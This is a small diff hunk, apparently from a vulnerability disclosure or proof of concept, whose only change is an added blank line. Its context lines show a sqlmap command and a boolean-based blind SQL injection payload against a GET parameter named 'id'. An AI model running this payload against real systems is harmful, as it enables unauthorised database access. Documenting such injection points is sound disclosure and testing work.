@@ -31,6 +31,7 @@ sqlmap.py -r poc.txt --dbms=mysql
 ----------------------
 
 Parameter: id (GET)
+
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
     Payload: id=test' AND 9297=(SELECT (CASE WHEN (9297=9297) THEN 9297 ELSE (SELECT 7413 UNION SELECT 9163) END))-- -
